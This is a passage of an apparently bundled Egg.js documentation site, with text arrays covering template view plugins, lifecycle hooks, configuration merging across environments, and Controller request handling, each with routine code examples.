`,paraId:9,tocIndex:1},{value:"The next step is to provide a View base class that will be instantiated on each request.",paraId:10,tocIndex:2},{value:"The base class of the View needs to provide ",paraId:11,tocIndex:2},{value:"render",paraId:11,tocIndex:2},{value:" and ",paraId:11,tocIndex:2},{value:"renderString",paraId:11,tocIndex:2},{value:" methods and supports generator and async functions (it can also be a function that returns a Promise). The ",paraId:11,tocIndex:2},{value:"render",paraId:11,tocIndex:2},{value:" method is used to render files, and the ",paraId:11,tocIndex:2},{value:"renderString",paraId:11,tocIndex:2},{value:" method is used to render template strings.",paraId:11,tocIndex:2},{value:"The following is a simplified code that can be directly ",paraId:12,tocIndex:2},{value:"view source",paraId:12,tocIndex:2},{value:`const ejs = require('ejs');

Mmdule.exports = class EjsView {
  render(filename, locals, viewOptions) {

    const config = Object.assign({}, this.config, viewOptions, { filename });

    return new Promise((resolve, reject) => {
      // Asynchronous API call
      ejs.renderFile(filename, locals, config, (err, result) => {
        if (err) {
          reject(err);
        } else {
          resolve(result);
        }
      });
    });
  }

  renderString(tpl, locals, viewOptions) {
    const config = Object.assign({}, this.config, viewOptions, { cache: null });
    try {
      // Synchronous API call
      return Promise.resolve(ejs.render(tpl, locals, config));
    } catch (err) {
      return Promise.reject(err);
    }
  }
};
`,paraId:13,tocIndex:2},{value:"The three parameters of the ",paraId:14,tocIndex:3},{value:"render",paraId:14,tocIndex:3},{value:" method are:",paraId:14,tocIndex:3},{value:"filename",paraId:15,tocIndex:3},{value:": is the path to the complete file. The framework determines if the file exists when looking for the file. It does not need to be processed here.",paraId:15,tocIndex:3},{value:"locals",paraId:15,tocIndex:3},{value:": The data needs rendering. It comes from ",paraId:15,tocIndex:3},{value:"app.locals",paraId:15,tocIndex:3},{value:", ",paraId:15,tocIndex:3},{value:"ctx.locals",paraId:15,tocIndex:3},{value:" and calls ",paraId:15,tocIndex:3},{value:"render",paraId:15,tocIndex:3},{value:" methods. The framework also has built in ",paraId:15,tocIndex:3},{value:"ctx",paraId:15,tocIndex:3},{value:", ",paraId:15,tocIndex:3},{value:"request",paraId:15,tocIndex:3},{value:", ",paraId:15,tocIndex:3},{value:"ctx.helper",paraId:15,tocIndex:3},{value:" objects.",paraId:15,tocIndex:3},{value:"viewOptions",paraId:15,tocIndex:3},{value:": The incoming configuration of the user, which can override the default configuration of the template engine. This can be considered based on the characteristics of the template engine. For example, the cache is enabled by default but a page does not need to be cached.",paraId:15,tocIndex:3},{value:"The three parameters of the ",paraId:16,tocIndex:3},{value:"renderString",paraId:16,tocIndex:3},{value:" method:",paraId:16,tocIndex:3},{value:"tpl",paraId:17,tocIndex:3},{value:": template string, not file path.",paraId:17,tocIndex:3},{value:"locals",paraId:17,tocIndex:3},{value:": same with ",paraId:17,tocIndex:3},{value:"render",paraId:17,tocIndex:3},{value:".",paraId:17,tocIndex:3},{value:"viewOptions",paraId:17,tocIndex:3},{value:": same with ",paraId:17,tocIndex:3},{value:"render",paraId:17,tocIndex:3},{value:".",paraId:17,tocIndex:3},{value:"According to the naming conventions mentioned above, the configuration name is generally the name of the template engine, such as ejs.",paraId:18,tocIndex:4},{value:"The configuration of the plugin mainly comes from the configuration of the template engine, and the configuration items can be defined according to the specific conditions, such as the ",paraId:19,tocIndex:4},{value:"configuration of ejs",paraId:19,tocIndex:4},{value:".",paraId:19,tocIndex:4},{value:`// config/config.default.js
module.exports = {
  ejs: {
    cache: true,
  },
};
`,paraId:20,tocIndex:4},{value:"The framework provides ",paraId:21,tocIndex:5},{value:"ctx.helper",paraId:21,tocIndex:5},{value:" for developer use, but in some cases we want to override the helper method and only take effect when the template is rendered.",paraId:21,tocIndex:5},{value:"In template rendering, we often need to output a user-supplied html fragment, in which case, we often use the ",paraId:22,tocIndex:5},{value:"helper.shtml",paraId:22,tocIndex:5},{value:" provided by the ",paraId:22,tocIndex:5},{value:"egg-security",paraId:22,tocIndex:5},{value:" plugin.",paraId:22,tocIndex:5},{value:`<div>{{ helper.shtml(data.content) | safe }}</div>
`,paraId:23,tocIndex:5},{value:"However, as shown in the code above, we need to use ",paraId:24,tocIndex:5},{value:"| safe",paraId:24,tocIndex:5},{value:" to tell the template engine that the html is safe and it doesn't need to run ",paraId:24,tocIndex:5},{value:"escape",paraId:24,tocIndex:5},{value:" again.",paraId:24,tocIndex:5},{value:"This is more cumbersome to use and easy to forget, so we can package it:",paraId:25,tocIndex:5},{value:"First provide a helper subclass:",paraId:26,tocIndex:5},{value:`// {plugin_root}/lib/helper.js
module.exports = (app) => {
  return class ViewHelper extends app.Helper {
    // safe is injected by [egg-view-nunjucks] and will not be escaped during rendering.
    // Otherwise, the template call shtml will be escaped
    shtml(str) {
      return this.safe(super.shtml(str));
    }
  };
};
`,paraId:27,tocIndex:5},{value:"Use a custom helper when rendering:",paraId:28,tocIndex:5},{value:`// {plugin_root}/lib/view.js
const ViewHelper = require('./helper');

module.exports = class MyCustomView {
  render(filename, locals) {
    locals.helper = new ViewHelper(this.ctx); // call Nunjucks render
  }
};
`,paraId:29,tocIndex:5},{value:"You can ",paraId:30,tocIndex:5},{value:"view",paraId:30,tocIndex:5},{value:" the specific code here",paraId:30,tocIndex:5},{value:"Templates and security are related and ",paraId:31,tocIndex:6},{value:"egg-security",paraId:31,tocIndex:6},{value:" also provides some methods for the template. The template engine can be used according to requirements.",paraId:31,tocIndex:6},{value:"First declare a dependency on ",paraId:32,tocIndex:6},{value:"egg-security",paraId:32,tocIndex:6},{value:":",paraId:32,tocIndex:6},{value:`{
  "name": "egg-view-nunjucks",
  "eggPlugin": {
    "name": "nunjucks",
    "dep": ["security"]
  }
}
`,paraId:33,tocIndex:6},{value:"Besides, the framework provides ",paraId:34,tocIndex:6},{value:"app.injectCsrf",paraId:35,tocIndex:6},{value:" and ",paraId:34,tocIndex:6},{value:"app.injectNonce",paraId:36,tocIndex:6},{value:", for more information on ",paraId:34,tocIndex:6},{value:"security section",paraId:37,tocIndex:6},{value:".",paraId:34,tocIndex:6},{value:"As a high-quality plugin, perfect unit testing is indispensable, and we also provide lots of auxiliary tools to make it painless for plugin developers to write tests with, see ",paraId:38,tocIndex:7},{value:"unit testing",paraId:39,tocIndex:7},{value:" and ",paraId:38,tocIndex:7},{value:"plugin",paraId:40,tocIndex:7},{value:" docs.",paraId:38,tocIndex:7}]},48886:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(42283);const t=[{value:"When the application starts up, we often need to set up some initialization logic. The application bootstraps with those specific configurations. It is in a healthy state and be able to take external service requests after those configurations successfully applied. Otherwise, it failed.",paraId:0},{value:"The framework provides a unified entry file (",paraId:1},{value:"app.js",paraId:1},{value:") for boot process customization. This file need returns a Boot class. We can define the initialization process in the startup application by defining the lifecycle method in the Boot class.",paraId:1},{value:"The framework has provided you several functions to handle during the whole ",paraId:2},{value:"life cycle",paraId:3},{value:":",paraId:2},{value:"configWillLoad",paraId:4},{value:": All the config files are ready to load, so this is the LAST chance to modify them.",paraId:4},{value:"configDidLoad",paraId:4},{value:": When all the config files have been loaded.",paraId:4},{value:"didLoad",paraId:4},{value:": When all the files have been loaded.",paraId:4},{value:"willReady",paraId:4},{value:": When all the plug-ins are ready.",paraId:4},{value:"didReady",paraId:4},{value:": When all the workers are ready.",paraId:4},{value:"serverDidReady",paraId:4},{value:": When the server is ready.",paraId:4},{value:"beforeClose",paraId:4},{value:": Before the application is closed.",paraId:4},{value:"We can defined Boot class in ",paraId:5},{value:"app.js",paraId:5},{value:". Below we take a few examples of lifecycle functions commonly used in application development:",paraId:5},{value:`// app.js
class AppBootHook {
  constructor(app) {
    this.app = app;
  }

  configWillLoad() {
    // The config file has been read and merged, but it has not yet taken effect
    // This is the last time the application layer modifies the configuration
    // Note: This function only supports synchronous calls.

    // For example: the password in the parameter is encrypted, decrypt it here
    this.app.config.mysql.password = decrypt(this.app.config.mysql.password);
    // For example: insert a middleware into the framework's coreMiddleware
    const statusIdx = this.app.config.coreMiddleware.indexOf('status');
    this.app.config.coreMiddleware.splice(statusIdx + 1, 0, 'limit');
  }

  async didLoad() {
    // All configurations have been loaded
    // Can be used to load the application custom file, start a custom service

    // Example: Creating a custom app example
    this.app.queue = new Queue(this.app.config.queue);
    await this.app.queue.init();

    // For example: load a custom directory
    this.app.loader.loadToContext(path.join(__dirname, 'app/tasks'), 'tasks', {
      fieldClass: 'tasksClasses',
    });
  }

  async willReady() {
    // All plugins have been started, but the application is not yet ready
    // Can do some data initialization and other operations
    // Application will start after these operations executed succcessfully

    // For example: loading data from the database into the in-memory cache
    this.app.cacheData = await this.app.model.query(QUERY_CACHE_SQL);
  }

  async didReady() {
    // Application already ready

    const ctx = await this.app.createAnonymousContext();
    await ctx.service.Biz.request();
  }

  async serverDidReady() {
    // http / https server has started and begins accepting external requests
    // At this point you can get an instance of server from app.server

    this.app.server.on('timeout', (socket) => {
      // handle socket timeout
    });
  }
}

module.exports = AppBootHook;
`,paraId:6},{value:"Note: It is not recommended to do long-time operations in the custom lifecycle function, because the framework has a startup timeout detection.",paraId:7},{value:`If your Egg's life-cycle functions are old, we suggest you upgrading to the "class-method" mode. For more you can refer to `,paraId:8},{value:"Upgrade your event functions in your lifecycle",paraId:9},{value:".",paraId:8}]},5215:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(85667);const t=[{value:"This framework provides powerful and extensible configuration function, including automatically merging applications, plugins, and framework's configuration. In addition, it allows users to overwrite configuration in sequence and maintain different configs depending on different environments. The result (i.e. merged config) can be accessed from ",paraId:0},{value:"app.config ",paraId:0},{value:".",paraId:0},{value:"Here are some common control tactics:",paraId:1},{value:"Using platform to manage configurations: while building a new application, you can put the current environment configuration into package and trigger the configuration as long as you run this application. But this certain application won't be able to build several deployments at once, and you will get into trouble whenever you want to use the configuration in localhost.",paraId:2},{value:"Using platform to manage configurations: you can pass the current environment configuration via environment variables while starting. This is a relatively elegant approach with higher requirement on operation and support from configuration platform. Moreover, The configuration environment has same flaws as first method.",paraId:2},{value:"Using code to manage configurations: you can add some environment configurations in codes and pass them to current environment arguments while starting. However, it doesn't allow you to configure globally and you need to alter your code whenever you want to change the configuration.",paraId:2},{value:"we choose the last strategy, namely ",paraId:3},{value:"configure with code",paraId:3},{value:", The change of configuration should be also released after reviewing. The application package itself is capable to be deployed in several environments, only need to specify the running environment.",paraId:3},{value:"This framework supports loading configuration according to the environment and defining configuration files of multiple environments. For more details, please check ",paraId:4,tocIndex:0},{value:"env",paraId:5,tocIndex:0},{value:".",paraId:4,tocIndex:0},{value:`config
|- config.default.js
|- config.prod.js
|- config.unittest.js
|- config.local.js
`,paraId:6,tocIndex:0},{value:"config.default.js",paraId:7,tocIndex:0},{value:" is the default file for configuration, and all environments will load this file. Besides, this is usually used as default configuration file for development environment.",paraId:7,tocIndex:0},{value:"The corresponding configuration file(named configuration) will be loaded simultaneously when you set up env. The named configuration and the default configuration will combine(use ",paraId:8,tocIndex:0},{value:"extend2",paraId:8,tocIndex:0},{value:" deep clone) into a configuration eventually. And the same name will be overwritten. For example, ",paraId:8,tocIndex:0},{value:"prod",paraId:8,tocIndex:0},{value:" environment will load ",paraId:8,tocIndex:0},{value:"config.prod.js",paraId:8,tocIndex:0},{value:" and ",paraId:8,tocIndex:0},{value:"config.default.js",paraId:8,tocIndex:0},{value:". As a result, ",paraId:8,tocIndex:0},{value:"config.prod.js",paraId:8,tocIndex:0},{value:" will overwrite the configuration with identical name in ",paraId:8,tocIndex:0},{value:"config.default.js",paraId:8,tocIndex:0},{value:".",paraId:8,tocIndex:0},{value:"The configuration file returns an object which could overwrite some configurations in the framework. Application can put its own business configuration into it for convenient management.",paraId:9,tocIndex:1},{value:`// configure the catalog of logger\uFF0Cthe default configuration of logger is provided by framework
module.exports = {
  logger: {
    dir: '/home/admin/logs/demoapp',
  },
};
`,paraId:10,tocIndex:1},{value:"The configuration file can simplify to ",paraId:11,tocIndex:1},{value:"exports.key = value",paraId:11,tocIndex:1},{value:" format",paraId:11,tocIndex:1},{value:`exports.keys = 'my-cookie-secret-key';
exports.logger = {
  level: 'DEBUG',
};
`,paraId:12,tocIndex:1},{value:"The configuration file can also return a function which could receive a parameter called ",paraId:13,tocIndex:1},{value:"appInfo",paraId:13,tocIndex:1},{value:`// put the catalog of logger to the catalog of codes
const path = require('path');
module.exports = (appInfo) => {
  return {
    logger: {
      dir: path.join(appInfo.baseDir, 'logs'),
    },
  };
};
`,paraId:14,tocIndex:1},{value:"The build-in appInfo contains:",paraId:15,tocIndex:1},{value:"appInfo",paraId:16,tocIndex:1},{value:"elaboration",paraId:16,tocIndex:1},{value:"pkg",paraId:16,tocIndex:1},{value:"package.json",paraId:16,tocIndex:1},{value:"name",paraId:16,tocIndex:1},{value:"Application name, same as pkg.name",paraId:16,tocIndex:1},{value:"baseDir",paraId:16,tocIndex:1},{value:"The directory of codes",paraId:16,tocIndex:1},{value:"HOME",paraId:16,tocIndex:1},{value:"User directory, e.g, the account of admin is /home/admin",paraId:16,tocIndex:1},{value:"root",paraId:16,tocIndex:1},{value:"The application root directory, if the environment is local or unittest, it is baseDir. Otherwise, it is HOME",paraId:16,tocIndex:1},{value:"appInfo.root",paraId:17,tocIndex:1},{value:" is an elegant adaption. for example, we tend to use ",paraId:17,tocIndex:1},{value:"/home/admin/logs",paraId:17,tocIndex:1},{value:" as the catalog of log in the server environment, while we don't want to pollute the user catalog in local development. This adaptation is very good at solving this problem.",paraId:17,tocIndex:1},{value:"Choose the appropriate style according to the specific situation, but please make sure you don't make mistake like the code below:",paraId:18,tocIndex:1},{value:`// config/config.default.js
exports.someKeys = 'abc';
module.exports = (appInfo) => {
  const config = {};
  config.keys = '123456';
  return config;
};
`,paraId:19,tocIndex:1},{value:"Applications, plugin components and framework are able to define those configs. Even though the structure of catalog is identical but there is priority (application > framework > plugin). Besides, the running environment has the higher priority.",paraId:20,tocIndex:2},{value:'Here is one sequence of loading configurations under "prod" environment, in which the following configuration will overwrite the previous configuration with the same name.',paraId:21,tocIndex:2},{value:`-> plugin config.default.js
-> framework config.default.js
-> application config.default.js
-> plugin config.prod.js
-> framework config.prod.js
-> application config.prod.js
`,paraId:22,tocIndex:2},{value:"Note: there will be plugin loading sequence, but the approximate order is similar. For specific logic, please check the ",paraId:23,tocIndex:2},{value:"loader",paraId:24,tocIndex:2},{value:" .",paraId:23,tocIndex:2},{value:"Configs are merged using deep copy from [extend2] module, which is forked from [extend] and process array in a different way.",paraId:25,tocIndex:3},{value:`const a = {
  arr: [1, 2],
};
const b = {
  arr: [3],
};
extend(true, a, b);
// => { arr: [ 3 ] }
`,paraId:26,tocIndex:3},{value:"As demonstrated above, the framework will overwrite arrays instead of merging them.",paraId:27,tocIndex:3},{value:"The final merged config will be dumped to ",paraId:28,tocIndex:4},{value:"run/application_config.json",paraId:28,tocIndex:4},{value:"(for worker process) and ",paraId:28,tocIndex:4},{value:"run/agent_config.json",paraId:28,tocIndex:4},{value:"(for agent process) when the framework started, which can help analyzing problems.",paraId:28,tocIndex:4},{value:"Some fields are hidden in the config file, mainly including 2 types:",paraId:29,tocIndex:4},{value:"like passwords, secret keys and other security related fields which can be configured in ",paraId:30,tocIndex:4},{value:"config.dump.ignore",paraId:30,tocIndex:4},{value:" and only ",paraId:30,tocIndex:4},{value:"Set",paraId:30,tocIndex:4},{value:" type is accepted. See ",paraId:30,tocIndex:4},{value:"Default Configs",paraId:30,tocIndex:4},{value:"like Function, Buffer, etc. whose content converted by ",paraId:30,tocIndex:4},{value:"JSON.stringify",paraId:30,tocIndex:4},{value:" will be specially large.",paraId:30,tocIndex:4},{value:"run/application_config_meta.json",paraId:31,tocIndex:4},{value:" (for worker process\uFF09and ",paraId:31,tocIndex:4},{value:"run/agent_config_meta.json",paraId:31,tocIndex:4},{value:" (for agent process) will also be dumped in order to check which file defines the property, see below",paraId:31,tocIndex:4},{value:`{
  "logger": {
    "dir": "/path/to/config/config.default.js"
  }
}
`,paraId:32,tocIndex:4}]},51768:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(58920);const t=[{value:"The previous chapter",paraId:0,tocIndex:0},{value:" says router is mainly used to describe the relationship between the request URL and the Controller that processes the request eventually, so what is a Controller used for?",paraId:1,tocIndex:0},{value:"Simply speaking, a Controller is used for ",paraId:2,tocIndex:0},{value:"parsing user's input and send back the relative result after processing",paraId:2,tocIndex:0},{value:", for example:",paraId:2,tocIndex:0},{value:"In ",paraId:3,tocIndex:0},{value:"RESTful",paraId:3,tocIndex:0},{value:" interfaces, Controller accepts parameters from users and sends selected results back to user or modifies data in the database.",paraId:3,tocIndex:0},{value:"In the HTML page requests, Controller renders related templates to HTML according to different URLs requested and then sends back to users.",paraId:3,tocIndex:0},{value:"In the proxy servers, Controller transfers user's requests to other servers and sends back process results to users in return.",paraId:3,tocIndex:0},{value:"The framework recommends that the Controller layer is responsible for processing request parameters(verification and transformation) from user's requests, then calls related business methods in ",paraId:4,tocIndex:0},{value:"Service",paraId:5,tocIndex:0},{value:", encapsulates and sends back business result:",paraId:4,tocIndex:0},{value:"retrieves parameters passed by HTTP.",paraId:6,tocIndex:0},{value:"verifies and assembles parameters.",paraId:6,tocIndex:0},{value:"calls the Service to handle business, if necessary, transforms Service process results to satisfy user's requirement.",paraId:6,tocIndex:0},{value:"sends results back to user by HTTP.",paraId:6,tocIndex:0},{value:"All Controller files must be put under ",paraId:7,tocIndex:1},{value:"app/controller",paraId:7,tocIndex:1},{value:" directory, which can support multi-level directory. when accessing, cascading access can be done through directory names. Controllers can be written in various patterns depending on various project scenarios and development styles.",paraId:7,tocIndex:1},{value:"You can write a Controller by defining a Controller class:",paraId:8,tocIndex:2},{value:`// app/controller/post.js
const Controller = require('egg').Controller;
class PostController extends Controller {
  async create() {
    const { ctx, service } = this;
    const createRule = {
      title: { type: 'string' },
      content: { type: 'string' },
    };
    // verify parameters
    ctx.validate(createRule);
    // assemble parameters
    const author = ctx.session.userId;
    const req = Object.assign(ctx.request.body, { author });
    // calls Service to handle business
    const res = await service.post.create(req);
    // set response content and status code
    ctx.body = { id: res.id };
    ctx.status = 201;
  }
}
module.exports = PostController;
`,paraId:9,tocIndex:2},{value:"We've defined a ",paraId:10,tocIndex:2},{value:"PostController",paraId:10,tocIndex:2},{value:" class above and every method of this Controller can be used in Router, we can locate it from ",paraId:10,tocIndex:2},{value:"app.controller",paraId:10,tocIndex:2},{value:" according to the file name and the method name.",paraId:10,tocIndex:2},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.post('createPost', '/api/posts', controller.post.create);
};
`,paraId:11,tocIndex:2},{value:"Multi-level directory is supported, for example, put the above code into ",paraId:12,tocIndex:2},{value:"app/controller/sub/post.js",paraId:12,tocIndex:2},{value:", then we could mount it by:",paraId:12,tocIndex:2},{value:`// app/router.js
module.exports = (app) => {
  app.router.post('createPost', '/api/posts', app.controller.sub.post.create);
};
`,paraId:13,tocIndex:2},{value:"The defined Controller class will initialize a new object for every request when accessing the server, and some of the following attributes will be attached to ",paraId:14,tocIndex:2},{value:"this",paraId:14,tocIndex:2},{value:" since the Controller classes in the project are inherited from ",paraId:14,tocIndex:2},{value:"egg.Controller",paraId:14,tocIndex:2},{value:".",paraId:14,tocIndex:2},{value:"this.ctx",paraId:15,tocIndex:2},{value:": the instance of ",paraId:15,tocIndex:2},{value:"Context",paraId:16,tocIndex:2},{value:" for current request, through which we can access many attributes and methods encapsulated by the framework to handle current request conveniently.",paraId:15,tocIndex:2},{value:"this.app",paraId:15,tocIndex:2},{value:": the instance of ",paraId:15,tocIndex:2},{value:"Application",paraId:17,tocIndex:2},{value:" for current request, through which we can access global objects and methods provided by the framework.",paraId:15,tocIndex:2},{value:"this.service",paraId:15,tocIndex:2},{value:": ",paraId:15,tocIndex:2},{value:"Service",paraId:18,tocIndex:2},{value:" defined by the application, through which we can access the abstract business layer, equivalent to ",paraId:15,tocIndex:2},{value:"this.ctx.service",paraId:15,tocIndex:2},{value:".",paraId:15,tocIndex:2},{value:"this.config",paraId:15,tocIndex:2},{value:": the application's run-time ",paraId:15,tocIndex:2},{value:"config",paraId:19,tocIndex:2},{value:".",paraId:15,tocIndex:2},{value:"this.logger",paraId:15,tocIndex:2},{value:"\uFF1Alogger with ",paraId:15,tocIndex:2},{value:"debug",paraId:15,tocIndex:2},{value:"\uFF0C",paraId:15,tocIndex:2},{value:"info",paraId:15,tocIndex:2},{value:"\uFF0C",paraId:15,tocIndex:2},{value:"warn",paraId:15,tocIndex:2},{value:"\uFF0C",paraId:15,tocIndex:2},{value:"error",paraId:15,tocIndex:2},{value:", use to print different level log, is almost the same as ",paraId:15,tocIndex:2},{value:"context logger",paraId:20,tocIndex:2},{value:", but it will append Controller file path for quickly track.",paraId:15,tocIndex:2},{value:"Defining a Controller class helps us not only abstract the Controller layer codes better(e.g. some unified processing can be abstracted as private) but also encapsulate methods that are widely used in the application by defining a customized Controller base class.",paraId:21,tocIndex:3},{value:`// app/core/base_controller.js
const { Controller } = require('egg');
class BaseController extends Controller {
  get user() {
    return this.ctx.session.user;
  }

  success(data) {
    this.ctx.body = {
      success: true,
      data,
    };
  }

  notFound(msg) {
    msg = msg || 'not found';
    this.ctx.throw(404, msg);
  }
}
module.exports = BaseController;
`,paraId:22,tocIndex:3},{value:"Now we can use base class' methods by inheriting from ",paraId:23,tocIndex:3},{value:"BaseController",paraId:23,tocIndex:3},{value:":",paraId:23,tocIndex:3},{value:`//app/controller/post.js
const Controller = require('../core/base_controller');
class PostController extends Controller {
  async list() {
    const posts = await this.service.listByUser(this.user);
    this.success(posts);
  }
}
`,paraId:24,tocIndex:3},{value:"Every Controller is an async function, whose argument is the instance of the request ",paraId:25,tocIndex:4},{value:"Context",paraId:26,tocIndex:4},{value:" and through which we can access many attributes and methods encapsulated by the framework conveniently.",paraId:25,tocIndex:4},{value:"For example, when we define a Controller relative to ",paraId:27,tocIndex:4},{value:"POST /api/posts",paraId:27,tocIndex:4},{value:", we create a ",paraId:27,tocIndex:4},{value:"post.js",paraId:27,tocIndex:4},{value:" file under ",paraId:27,tocIndex:4},{value:"app/controller",paraId:27,tocIndex:4},{value:" directory.",paraId:27,tocIndex:4},{value:`// app/controller/post.js
exports.create = async (ctx) => {
  const createRule = {
    title: { type: 'string' },
    content: { type: 'string' },
  };
  // verify parameters
  ctx.validate(createRule);
  // assemble parameters
  const author = ctx.session.userId;
  const req = Object.assign(ctx.request.body, { author });
  // calls Service to handle business
  const res = await ctx.service.post.create(req);
  // set response content and status code
  ctx.body = { id: res.id };
  ctx.status = 201;
};
`,paraId:28,tocIndex:4},{value:"In the above example, we introduce some new concepts, however it's still intuitive and understandable. We'll explain these new concepts in detail soon.",paraId:29,tocIndex:4},{value:"Since Controller is probably the only place to interact with HTTP protocol when developing business logics, it's necessary to have a quick look at how HTTP protocol works before going on.",paraId:30,tocIndex:5},{value:"If we send a HTTP request to access the previous example Controller:",paraId:31,tocIndex:5},{value:`curl -X POST http://localhost:3000/api/posts --data '{"title":"controller", "content": "what is controller"}' --header 'Content-Type:application/json; charset=UTF-8'
`,paraId:32,tocIndex:5},{value:"The HTTP request sent by curl looks like this:",paraId:33,tocIndex:5},{value:`POST /api/posts HTTP/1.1
Host: localhost:3000
Content-Type: application/json; charset=UTF-8

{"title": "controller", "content": "what is controller"}
`,paraId:34,tocIndex:5},{value:"The first line of the request contains three information, first two of which are commonly used:",paraId:35,tocIndex:5},{value:"method: it's ",paraId:36,tocIndex:5},{value:"POST",paraId:36,tocIndex:5},{value:" in this example.",paraId:36,tocIndex:5},{value:"path: it's ",paraId:36,tocIndex:5},{value:"/api/posts",paraId:36,tocIndex:5},{value:", if the user's request contains query, it will also be placed here.",paraId:36,tocIndex:5},{value:"From the second line to the place where the first empty line appears is the Header part of the request which includes many useful attributes. as you may see, Host, Content-Type and ",paraId:37,tocIndex:5},{value:"Cookie",paraId:37,tocIndex:5},{value:", ",paraId:37,tocIndex:5},{value:"User-Agent",paraId:37,tocIndex:5},{value:", etc. There are two headers in this request:",paraId:37,tocIndex:5},{value:"Host",paraId:38,tocIndex:5},{value:": when we send a request in the browser, the domain is resolved to server IP by DNS and, as well, the domain and port are sent to the server in the Host header by the browser.",paraId:38,tocIndex:5},{value:"Content-Type",paraId:38,tocIndex:5},{value:": when we have a body in our request, the Content-Type is provided to describe the type of our request body.",paraId:38,tocIndex:5},{value:"The whole following content is the request body, which can be brought by POST, PUT, DELETE and other methods. and the server resolves the request body according to Content-Type.",paraId:39,tocIndex:5},{value:"When the sever finishes to process the request, a HTTP response is sent back to the client:",paraId:40,tocIndex:5},{value:`HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
Content-Length: 8
Date: Mon, 09 Jan 2017 08:40:28 GMT
Connection: keep-alive

{"id": 1}
`,paraId:41,tocIndex:5},{value:"The first line contains three segments, among which the ",paraId:42,tocIndex:5},{value:"status code",paraId:42,tocIndex:5},{value:" is used mostly, in this case, it's 201 which means the server has created a resource successfully.",paraId:42,tocIndex:5},{value:"Similar to the request, the header part begins at the second line and ends at the place where the next empty line appears, in this case, they are Content-Type and Content-Length indicating the response format is JSON and the length is 8 bytes.",paraId:43,tocIndex:5},{value:"The remaining part is the actual content of this response.",paraId:44,tocIndex:5},{value:"It can be seen from the above HTTP request examples that there are many places can be used to put user's request data. The framework provides many convenient methods and attributes by binding the Context instance to Controllers to acquire parameters sent by users through HTTP request.",paraId:45,tocIndex:6},{value:"query",paraId:46},{value:"Usually the Query String, string following ",paraId:47,tocIndex:7},{value:"?",paraId:47,tocIndex:7},{value:" in the URL, is used to send parameters by request of GET type. For example, ",paraId:47,tocIndex:7},{value:"category=egg&language=node",paraId:47,tocIndex:7},{value:" in ",paraId:47,tocIndex:7},{value:"GET /posts?category=egg&language=node",paraId:47,tocIndex:7},{value:" is the parameter that user sends. We can acquire this parsed parameter body through ",paraId:47,tocIndex:7},{value:"ctx.query",paraId:47,tocIndex:7},{value:":",paraId:47,tocIndex:7},{value:`class PostController extends Controller {
  async listPosts() {
    const query = this.ctx.query;
    // {
    //   category: 'egg',
    //   language: 'node',
    // }
  }
}
`,paraId:48,tocIndex:7},{value:"If duplicated keys exist in Query String, only the first value of this key is used by ",paraId:49,tocIndex:7},{value:"ctx.query",paraId:49,tocIndex:7},{value:" and the subsequent appearance will be omitted. That is to say, for request ",paraId:49,tocIndex:7},{value:"GET /posts?category=egg&category=koa",paraId:49,tocIndex:7},{value:", what ",paraId:49,tocIndex:7},{value:"ctx.query",paraId:49,tocIndex:7},{value:" acquires is ",paraId:49,tocIndex:7},{value:"{ category: 'egg' }",paraId:49,tocIndex:7},{value:".",paraId:49,tocIndex:7},{value:"This is for unity reason, because we usually do not design users to pass parameters with same keys in Query String then we write codes like below:",paraId:50,tocIndex:7},{value:`const key = ctx.query.key || '';
if (key.startsWith('egg')) {
  // do something
}
`,paraId:51,tocIndex:7},{value:"Or if someone passes parameters with same keys in Query String on purpose, system error may be thrown. To avoid this, the framework guarantee that the parameter must be a string type whenever it is acquired from ",paraId:52,tocIndex:7},{value:"ctx.query",paraId:52,tocIndex:7},{value:".",paraId:52,tocIndex:7},{value:"queries",paraId:46},{value:"Sometimes our system is designed to accept same keys sent by users, like ",paraId:53,tocIndex:8},{value:"GET /posts?category=egg&id=1&id=2&id=3",paraId:53,tocIndex:8},{value:". For this situation, the framework provides ",paraId:53,tocIndex:8},{value:"ctx.queries",paraId:53,tocIndex:8},{value:" object to parse Query String and put duplicated data into an array:",paraId:53,tocIndex:8},{value:`// GET /posts?category=egg&id=1&id=2&id=3
class PostController extends Controller {
  async listPosts() {
    console.log(this.ctx.queries);
    // {
    //   category: [ 'egg' ],
    //   id: [ '1', '2', '3' ],
    // }
  }
}
`,paraId:54,tocIndex:8},{value:"All key on the ",paraId:55,tocIndex:8},{value:"ctx.queries",paraId:55,tocIndex:8},{value:" will be an array type if it has a value.",paraId:55,tocIndex:8},{value:"In ",paraId:56,tocIndex:9},{value:"Router",paraId:57,tocIndex:9},{value:" part, we say Router is allowed to declare parameters which can be acquired by ",paraId:56,tocIndex:9},{value:"ctx.params",paraId:56,tocIndex:9},{value:".",paraId:56,tocIndex:9},{value:`// app.get('/projects/:projectId/app/:appId', 'app.listApp');
// GET /projects/1/app/2
class AppController extends Controller {
  async listApp() {
    assert.equal(this.ctx.params.projectId, '1');
    assert.equal(this.ctx.params.appId, '2');
  }
}
`,paraId:58,tocIndex:9},{value:"body",paraId:46},{value:"Although we can pass parameters through URL, but constraints exist:",paraId:59,tocIndex:10},{value:"the browser limits the maximum length of a URL",paraId:60,tocIndex:10},{value:", so too many parameters cannot be passed.",paraId:60,tocIndex:10},{value:"the server records the full request URL to log files so it is not safe to pass sensitive data through URL.",paraId:60,tocIndex:10},{value:"In the above HTTP request message example, we can learn, following the header, there's a body part that can be used to put parameters for POST, PUT and DELETE, etc. The ",paraId:61,tocIndex:10},{value:"Content-Type",paraId:61,tocIndex:10},{value:" will be sent by clients(browser) in the same time to tell the server the type of request body when there is a body in a general request. Two mostly used data formats are JSON and Form in Web developing for transferring data.",paraId:61,tocIndex:10},{value:"The ",paraId:62,tocIndex:10},{value:"bodyParser",paraId:62,tocIndex:10},{value:" middleware is built in by the framework to parse the request body of these two kinds of formats into an object mounted to ",paraId:62,tocIndex:10},{value:"ctx.request.body",paraId:62,tocIndex:10},{value:". Since it's not recommended by the HTTP protocol to pass a body by GET and HEAD methods, ",paraId:62,tocIndex:10},{value:"ctx.request.body",paraId:62,tocIndex:10},{value:" cannot be used for GET and HEAD methods.",paraId:62,tocIndex:10},{value:`// POST /api/posts HTTP/1.1
// Host: localhost:3000
// Content-Type: application/json; charset=UTF-8
//
// {"title": "controller", "content": "what is controller"}
class PostController extends Controller {
  async listPosts() {
